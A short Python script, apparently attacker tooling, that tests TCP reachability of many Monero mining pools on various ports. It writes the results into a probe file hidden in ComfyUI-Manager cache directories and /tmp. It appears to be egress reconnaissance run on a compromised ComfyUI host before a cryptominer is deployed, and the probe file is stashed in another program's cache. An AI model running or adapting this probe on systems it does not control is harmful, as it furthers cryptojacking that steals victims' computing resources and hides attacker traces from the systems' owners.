import socket, glob, os
targets = [("pool.hashvault.pro",443),("pool.hashvault.pro",3333),("pool.hashvault.pro",80),
           ("pool.hashvault.pro",8080),("pool.supportxmr.com",443),("pool.supportxmr.com",3333),
           ("pool.supportxmr.com",9000),("gulf.moneroocean.stream",443),("gulf.moneroocean.stream",10001),
           ("moneroocean.stream",443),("moneroocean.stream",10001),("xmrpool.eu",3333),
           ("pool.minexmr.com",4444),("pool.minexmr.com",443),("minexmr.com",3333),
           ("pool.hashvault.pro", 9955),("stratum.hashvault.pro",443),("api.hashvault.pro",443)]
out=[]
for h,p in targets:
    try:
        s=socket.create_connection((h,p),timeout=8); s.settimeout(5)
        try: data=s.recv(200)
        except Exception: data=b""
        out.append("%s:%d OK recv=%r" % (h,p,data[:80])); s.close()
    except Exception as e:
        out.append("%s:%d ERR %r" % (h,p,e))
txt="\n".join(out)+"\n"
for d in glob.glob("/*/user/default/ComfyUI-Manager/cache")+["/tmp"]:
    try: open(os.path.join(d,"hk41_probe3.txt"),"a").write(txt)
    except Exception: pass
print(txt)
